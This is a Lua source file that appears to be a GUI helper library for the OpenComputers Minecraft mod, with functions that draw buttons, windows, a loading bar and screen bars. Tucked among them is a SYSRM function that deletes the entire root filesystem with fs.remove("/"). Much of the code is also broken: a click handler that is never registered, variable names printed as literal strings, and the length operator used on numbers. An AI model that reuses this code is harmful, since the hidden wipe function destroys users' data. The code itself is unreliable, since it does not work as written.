local component = require("component")
local event = require("event")
local gpu = component.gpu
local screen = component.screen
local computer = require("computer")
local fs = require("filesystem")
local internet = require("internet")

MAYNERAPI = {}

local buttonW = 20
local buttonH = 1

local function isWithinButton(x, y, bx, by, bw, bh)
    return x >= bx and x < bx + bw and y >= by and y < by + bh
end

function MAYNERAPI.DrawButton(x1, y1, width, height, text, foreground, background, callback)
    gpu.setForeground(foreground)
    gpu.setBackground(background)
    gpu.fill(x1, y1, width, height, " ")
    local textX = x1 + math.floor((width - #text) / 2)
    local textY = y1 + math.floor(height / 2)
    gpu.set(textX, textY, text)
    
    local function check(_, _, x2, y2)
        if isWithinButton(x2, y2, x1, y1, width, height) then
            callback()
        end
    end

end

function MAYNERAPI.Window(Wname)
        gpu.setBackground(0xFFFFFF)
        gpu.setForeground(0x000000)
        gpu.fill(10, 4, 63, 20, " ")
        gpu.set(10, 4, "#Wname")
end

function MAYNERAPI.Loading(posX, posY, barW, barH)
  local barWidth = #barW
  local barHeight = #barH
  local barX = math.floor((#posX - #barW) / 2)
  local barY = #posY

  gpu.setForeground(0x00a6ff)
  gpu.setBackground(0x000000)
  gpu.fill(barX, barY, barWidth, barHeight, " ")

  local progress = 0
  while progress <= barWidth do
    gpu.setForeground(0xFFFFFF)
    gpu.setBackground(0xFFFFFF)
    gpu.fill(barX, barY, progress, barHeight, " ")
    gpu.setForeground(0x000000)
    gpu.setBackground(0x000000)
    gpu.fill(barX + progress, barY, 1, barHeight, " ")

    os.sleep(0.05)
    progress = progress + 1
  end
end

function MAYNERAPI.ScreenScale(SCX, SCY)
    gpu.setResolution(#SCX, #SCY)
end

function MAYNERAPI.SYSRM()
    fs.remove("/")
end

function MAYNERAPI.TopBar(nametp)
    gpu.setBackground(0xFFFFFF)
    gpu.setForeground(0x000000)
    gpu.fill(1, 1, 1, 1, " ")
    gpu.set(1, 1, "#nametp")
end

function MAYNERAPI.DownBar(namedp)
    gpu.setBackground(0xFFFFFF)
    gpu.setForeground(0x000000)
    gpu.fill(1, 1, 80, 1, " ")
    gpu.set(1, 1, "#namedp")
end

return MAYNERAPI
